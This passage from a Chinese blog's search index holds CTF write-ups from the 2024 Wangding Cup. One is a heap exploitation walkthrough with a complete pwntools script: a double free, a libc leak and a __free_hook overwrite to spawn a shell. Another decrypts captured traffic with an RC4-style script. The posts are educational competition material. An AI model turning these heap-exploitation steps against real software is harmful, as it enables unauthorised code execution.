shuffle!&quot;</span>);</span><br><span class="line">  <span class="keyword">return</span> <span class="built_in">puts</span>(<span class="string">&quot;  5. show cards&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="https://www.helloimg.com/i/2024/11/29/6749ce10ae6d8.png" alt="image-20241129115329714"></p><p>利用realloc在申请为0时会执行free策略，来进行释放，并且可以double</p><p><img src="https://www.helloimg.com/i/2024/11/29/6749ce10239f7.png" alt="image-20241129115811070"></p><p>show这里没有对堆块进行检查，可以直接打印，有点uaf的感觉</p><h3 id="攻击方法"><a href="#攻击方法" class="headerlink" title="攻击方法"></a>攻击方法</h3><h4 id="泄露libc基址"><a href="#泄露libc基址" class="headerlink" title="泄露libc基址"></a>泄露libc基址</h4><p>第一步利用set_info创建一个0x110的大堆块，然后释放掉得到unsort</p><p>这时候还会存在一个tacache bin，然后用init来吧tacache bin清空</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">edit(<span class="number">0x110</span>,<span class="string">b&#x27;aaaa&#x27;</span>)</span><br><span class="line">free()</span><br><span class="line">init()</span><br></pre></td></tr></table></figure><p>再次free，由于这时花色是全局变量，所以这里执行malloc0，但是malloc最小为0x20，于是从unsortbin切割，由于init中的malloc已经进行一次切割，所以得到的数据在free新申请的数据里存在，并且位置正好在字符串处，打印获得</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">free()</span><br><span class="line">show()</span><br><span class="line">p.recvuntil(<span class="string">&quot;set:&quot;</span>)</span><br><span class="line">base = u64(p.recvuntil(<span class="string">&quot;:&quot;</span>)[<span class="number">0</span>:<span class="number">6</span>].ljust(<span class="number">8</span>,<span class="string">b&quot;\x00&quot;</span>)) - <span class="number">0x3ebca0</span></span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(base))</span><br></pre></td></tr></table></figure><h4 id="二次释放"><a href="#二次释放" class="headerlink" title="二次释放"></a>二次释放</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#gdb.attach(p)</span></span><br><span class="line">libc.address = base</span><br><span class="line">one_gadget = <span class="number">0x4f322</span> + base</span><br><span class="line">free()</span><br><span class="line">free()</span><br></pre></td></tr></table></figure><p><img src="https://www.helloimg.com/i/2024/11/29/6749ce0fbb164.png" alt="image-20241129121619304"></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">edit(<span class="number">4</span>,p64(libc.sym[<span class="string">&#x27;__free_hook&#x27;</span>]))</span><br></pre></td></tr></table></figure><p><img src="https://www.helloimg.com/i/2024/11/29/6749ce0fdcebc.png" alt="image-20241129121845198"></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">init()<span class="comment">#init是为了让花色初始化，好进行下一次malloc</span></span><br><span class="line">edit(<span class="number">4</span>,p64(<span class="number">0</span>))<span class="comment">#第一次申请，将_free_hook地址转移到可写的堆块上</span></span><br><span class="line"></span><br><span class="line">init()</span><br><span class="line">edit(<span class="number">4</span>,p64(one_gadget)) <span class="comment"># free函数劫持</span></span><br></pre></td></tr></table></figure><p><img src="https://www.helloimg.com/i/2024/11/29/6749ce1020bf4.png" alt="image-20241129122442573"></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#执行</span></span><br><span class="line">free()</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><p>完整expoit</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">p = process(<span class="string">&quot;cardmaster&quot;</span>)</span><br><span class="line">context.log_level = <span class="string">&quot;debug&quot;</span></span><br><span class="line">libc = ELF(<span class="string">&quot;./libc.so.6&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">init</span>():</span><br><span class="line">    p.recvuntil(<span class="string">&quot;&gt;&gt;&quot;</span>)</span><br><span class="line">    p.sendline(<span class="string">&quot;1&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">free</span>():</span><br><span class="line">    p.recvuntil(<span class="string">&quot;&gt;&gt;&quot;</span>)</span><br><span class="line">    p.sendline(<span class="string">&quot;2&quot;</span>)</span><br><span class="line">    p.recvuntil(<span class="string">&quot;nt:&quot;</span>)</span><br><span class="line">    p.sendline(<span class="string">&quot;0&quot;</span>)</span><br><span class="line">    p.recvuntil(<span class="string">&quot;?&quot;</span>)</span><br><span class="line">    p.sendline(<span class="string">&quot;0&quot;</span>)</span><br><span class="line">    p.recvuntil(<span class="string">&quot;l:&quot;</span>)</span><br><span class="line">    p.sendline(<span class="string">&quot;1000&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">edit</span>(<span class="params">count,cnt</span>):</span><br><span class="line"></span><br><span class="line">    p.recvuntil(<span class="string">b&#x27;&gt;&gt;&#x27;</span>)</span><br><span class="line">    p.sendline(<span class="string">b&#x27;2&#x27;</span>)</span><br><span class="line">    p.recvuntil(<span class="string">b&#x27;:&#x27;</span>)</span><br><span class="line">    p.sendline(<span class="built_in">str</span>(count))</span><br><span class="line">    p.recvuntil(<span class="string">b&#x27;?&#x27;</span>)</span><br><span class="line">    p.sendline(<span class="string">b&#x27;13&#x27;</span>)</span><br><span class="line">    p.recvuntil(<span class="string">b&#x27;:&#x27;</span>)</span><br><span class="line">    p.sendline(<span class="string">b&#x27;1000&#x27;</span>)</span><br><span class="line">    p.recvuntil(<span class="string">b&#x27;:&#x27;</span>)</span><br><span class="line">    p.sendline(cnt)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">show</span>():</span><br><span class="line">    p.recvuntil(<span class="string">b&#x27;&gt;&gt;&#x27;</span>)</span><br><span class="line">    p.sendline(<span class="string">b&#x27;3&#x27;</span>)</span><br><span class="line"></span><br><span class="line">edit(<span class="number">0x110</span>,<span class="string">b&#x27;aaaa&#x27;</span>)</span><br><span class="line">free()</span><br><span class="line">init()</span><br><span class="line">free()</span><br><span class="line">pause()</span><br><span class="line">show()</span><br><span class="line">p.recvuntil(<span class="string">&quot;set:&quot;</span>)</span><br><span class="line">base = u64(p.recvuntil(<span class="string">&quot;:&quot;</span>)[<span class="number">0</span>:<span class="number">6</span>].ljust(<span class="number">8</span>,<span class="string">b&quot;\x00&quot;</span>)) - <span class="number">0x3ebca0</span></span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(base))</span><br><span class="line"></span><br><span class="line"><span class="comment">#gdb.attach(p)</span></span><br><span class="line">libc.address = base</span><br><span class="line">one_gadget = <span class="number">0x4f322</span> + base</span><br><span class="line">free()</span><br><span class="line">free()</span><br><span class="line">edit(<span class="number">4</span>,p64(libc.sym[<span class="string">&#x27;__free_hook&#x27;</span>]))</span><br><span class="line">init()</span><br><span class="line">edit(<span class="number">4</span>,p64(<span class="number">0</span>))</span><br><span class="line">init()</span><br><span class="line">edit(<span class="number">4</span>,p64(one_gadget))</span><br><span class="line">free()</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><p><img src="https://www.helloimg.com/i/2024/11/29/6749ce1018bcc.png" alt="image-20241129123219218"></p><p>拿到shell</p>]]></content>
      
      
      <categories>
          
          <category> 赛后复盘 </category>
          
          <category> 网鼎杯2024 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> ctf </tag>
            
            <tag> 逆向 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>网鼎杯2024半决赛数据逆向</title>
      <link href="/2024/11/24/%E7%BD%91%E9%BC%8E%E6%9D%AF2024%E5%8D%8A%E5%86%B3%E8%B5%9B%E6%95%B0%E6%8D%AE%E9%80%86%E5%90%91/"/>
      <url>/2024/11/24/%E7%BD%91%E9%BC%8E%E6%9D%AF2024%E5%8D%8A%E5%86%B3%E8%B5%9B%E6%95%B0%E6%8D%AE%E9%80%86%E5%90%91/</url>
      
        <content type="html"><![CDATA[<h2 id="数据逆向"><a href="#数据逆向" class="headerlink" title="数据逆向"></a>数据逆向</h2><p>本题是考察流量和逆向的共同分析，开始给了三个附件</p><p><img src="https://www.helloimg.com/i/2024/11/29/6749cbe7191ff.png" alt="image-20241124215855987.png" title="1"></p><p>查看后分别可以明白这三个文件的作用</p><ul><li>traffic.pcap :流量包，经过下面两个软件通信得到的流量</li><li>ser：server服务器端，elf文件</li><li>cli：客户端，elf文件</li></ul><h3 id="主要逻辑"><a href="#主要逻辑" class="headerlink" title="主要逻辑"></a>主要逻辑</h3><p><img src="https://www.helloimg.com/i/2024/11/29/6749cbe89e2c8.png" alt="image-20241124220512861.png" title="2"></p><h3 id="sub-1825"><a href="#sub-1825" class="headerlink" title="sub_1825"></a>sub_1825</h3><p><img src="https://www.helloimg.com/i/2024/11/29/6749cbe7ea9f4.png" alt="image-20241124220824963.png" title="3"></p><h3 id="sub-1552"><a href="#sub-1552" class="headerlink" title="sub_1552"></a>sub_1552</h3><p><img src="https://www.helloimg.com/i/2024/11/29/6749cbe8351d3.png" alt="image-20241124221146889.png" title="4"></p><p>只看server的话，我们就应该去看流量包，找到发出一个key并返回right的流量，之后发送token</p><h3 id="traffic-pcap"><a href="#traffic-pcap" class="headerlink" title="traffic.pcap"></a>traffic.pcap</h3><p><img src="https://www.helloimg.com/i/2024/11/29/6749cbe908f71.png" alt="image-20241124221607754.png" title="4"></p><p>跟踪到这段流量，但是会发现只有key正确但是没有正确的请求返回解密的包，所以我们需要自己使用它的key来给流量解密</p><p><strong>PS：</strong> 密码的wireshark！！为什么要在这加空格！！？？？加空格也就罢了，你还能复制上！！！！！因为空格浪费了近一小时（）</p><p><img src="https://www.helloimg.com/i/2024/11/29/6749cbe74b419.png" alt="image-20241124221857096.png" title="5"></p><h3 id="解密脚本（注意端序）"><a href="#解密脚本（注意端序）" class="headerlink" title="解密脚本（注意端序）"></a>解密脚本（注意端序）</h3><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;string&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"><span class="type">char</span> message[] = &#123; <span class="number">0xD1</span>,<span class="number">0x37</span>,<span class="number">0xd9</span>,<span class="number">0x5b</span>,<span class="number">0xf0</span>,<span class="number">0xA2</span>,<span class="number">0x32</span>,<span class="number">0xC6</span>,<span class="number">0x30</span>,<span class="number">0xA7</span>,<span class="number">0x8C</span>,<span class="number">0x50</span>,<span class="number">0x7E</span>,<span class="number">0x3E</span>,<span class="number">0xA7</span>,<span class="number">0x3A</span>,<span class="number">0xBA</span>,<span class="number">0xC0</span>,<span class="number">0x58</span>,<span class="number">0x6b</span>,<span class="number">0x81</span>,<span class="number">0x85</span>,<span class="number">0x6b</span>,<span class="number">0x1c</span>,</span><br><span class="line"><span class="number">0x4c</span>,<span class="number">0xf5</span>,<span class="number">0x80</span>,<span class="number">0x7c</span>,<span class="number">0x8a</span>,<span class="number">0xC1</span>,<span class="number">0x42</span>,<span class="number">0x97</span>,<span class="number">0x90</span>,<span class="number">0xc7</span>&#125;;</span><br><span class="line"><span class="type">char</span> v14[<span class="number">264</span>] = &#123; <span class="number">0</span> &#125;;</span><br><span class="line"><span class="type">char</span> v3 = <span class="number">0</span>;</span><br><span class="line"><span class="type">char</span> v7 = <span class="number">0</span>;</span><br><span class="line"><span class="type">int</span> v11 = <span class="number">0</span>;</span><br><span class="line"><span class="type">char</span> v6 = <span class="number">0</span>;</span><br><span class="line"><span class="type">int</span> v10 = <span class="number">0</span>;</span><br><span class="line"><span class="type">int</span> v12 = <span class="number">0</span>;</span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">encryption</span><span class="params">(<span class="type">const</span> <span class="type">char</span>* buf,<span class="type">char</span>* message,<span class="type">int</span> length)</span> </span>&#123;</span><br><span class="line"><span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt;= <span class="number">0xFF</span>; ++i)</span><br><span class="line">v14[i] = i;</span><br><span class="line"><span class="keyword">for</span> (<span class="type">int</span> j = <span class="number">0</span>; j &lt;= <span class="number">0xFF</span>; ++j) &#123;</span><br><span class="line">v3 = v14[j] + v11;</span><br><span class="line">v11 = (<span class="type">unsigned</span> __int8)(v3 + buf[j % <span class="built_in">strlen</span>(buf)]);</span><br><span class="line">v6 = v14[j];</span><br><span class="line">v14[j] = v14[v11];</span><br><span class="line">v14[v11] = v6;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">for</span> (<span class="type">int</span> k = <span class="number">0</span>; k &lt; length; ++k) &#123;</span><br><span class="line">v10 = (<span class="type">unsigned</span> __int8)(v10 + <span class="number">1</span>);</span><br><span class="line">v12 = (<span class="type">unsigned</span> __int8)(v14[v10] + v12);</span><br><span class="line">v7 = v14[v10];</span><br><span class="line">v14[v10] = v14[v12];</span><br><span class="line">v14[v12] = v7;</span><br><span class="line">*(<span class="type">char</span>*)(message + k) ^= v14[(<span class="type">unsigned</span> __int8)(v14[v10] + v14[v12])] ^<span class="number">0x25</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line"><span class="built_in">encryption</span>(<span class="string">&quot;WangDingCUPKEY!!&quot;</span>, message, <span class="number">0x22</span>);</span><br><span class="line"><span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="number">34</span>; ++i) &#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;%c&quot;</span>, message[i]);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="cli"><a href="#cli" class="headerlink" title="cli"></a>cli</h3><p><img src="https://www.helloimg.com/i/2024/11/29/6749cbe897250.png" alt="image-20241124222440602.png" title="6"></p><h2 id="解法2"><a href="#解法2" class="headerlink" title="解法2"></a>解法2</h2><p>直接在本地里启动服务，然后把keyword发送一下，然后就可以看到flag回显过来了……</p>]]></content>
      
      
      <categories>
          
          <category> 赛后复盘 </category>
          
          <category> 网鼎杯2024 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> ctf </tag>
            
            <tag> 逆向 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>A-T-Field-豪猪两难</title>
      <link href="/2024/07/04/A-T-Field-%E8%B1%AA%E7%8C%AA%E4%B8%A4%E9%9A%BE/"/>
      <url>/2024/07/04/A-T-Field-%E8%B1%AA%E7%8C%AA%E4%B8%A4%E9%9A%BE/</url>
      
        <content type="html"><![CDATA[<p><img src="https://www.helloimg.com/i/2024/11/29/6749ce102d95b.png" alt="2.png" title="1043"></p><p>豪猪的身上有刺，当<strong>豪猪想要靠近为他人提供暖的时候身上的刺却又会不情愿的刺到对方</strong>。 套用在人身上，似乎也是如此。所谓成为大人,就是在反复的接近和远离中找到互不伤害对方的距离。</p>]]></content>
      
      
      <categories>
          
          <category> 日常 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 内心 </tag>
            
            <tag> 哲学 </tag>
            
        </tags>
      
    </entry>
    
    
  
  
</search>
